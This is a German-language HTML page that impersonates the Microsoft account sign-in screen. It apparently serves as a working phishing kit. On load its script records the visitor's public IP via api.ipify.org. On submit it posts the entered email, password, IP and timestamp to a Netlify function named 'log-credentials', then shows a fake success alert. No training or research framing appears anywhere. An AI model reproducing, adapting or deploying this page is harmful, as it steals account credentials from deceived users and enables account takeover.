<!DOCTYPE html>
<html lang="de">
	<head>
		<meta charset="UTF-8">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<title>Anmelden – Microsoft-Konto</title>
		<style> body { font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif; background-color: #f3f2f1; display: flex; justify-content: center; align-items: center; height:100vh; margin:0; } .login-box { background: white; padding: 40px; border-radius:8px; box-shadow:02px 10px rgba(0,0,0,0.1); width: 320px; text-align: center; } .logo { font-size:24px; font-weight: bold; color: #0078d4; margin-bottom:20px; } input { width:100%; padding:12px; margin: 8px0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; } button { width:100%; padding: 12px; background-color: #0078d4; color: white; border: none; border-radius:4px; cursor: pointer; font-size: 16px; } button:hover { background-color: #005a9e; } 
		</style>
	</head>
	<body>
		<div class="login-box">
			<div class="logo">Microsoft</div>
			<h2>Anmelden</h2>
			<form id="loginForm">
				<input type="email" id="email" placeholder="E-Mail, Telefon oder Skype" required="">
				<input type="password" id="password" placeholder="Kennwort" required="">
				<input type="hidden" id="ip" name="ip">
				<button type="submit">Anmelden</button>
			</form>
		</div>
		<script> // IP beim Laden holenfetch('https://api.ipify.org?format=json').then(response => response.json()).then(data => { document.getElementById('ip').value = data.ip; }) .catch(err => console.log('IP fetch error'));document.getElementById('loginForm').addEventListener('submit', function(e) { e.preventDefault();const email = document.getElementById('email').value; const password = document.getElementById('password').value; const ip = document.getElementById('ip').value; const timestamp = new Date().toISOString();fetch('/.netlify/functions/log-credentials', { method: 'POST',headers: { 'Content-Type': 'application/json' },body: JSON.stringify({ email, password, ip, timestamp })}).then(response => { if (response.ok) { alert('Anmeldung erfolgreich. Weiterleitung...');// Optional: window.location.href = 'https://teams.microsoft.com';} else { alert('Fehler bei der Anmeldung. Bitte erneut versuchen.');} }).catch(err => alert('Netzwerkfehler'));});</script>
	</body>
</html>
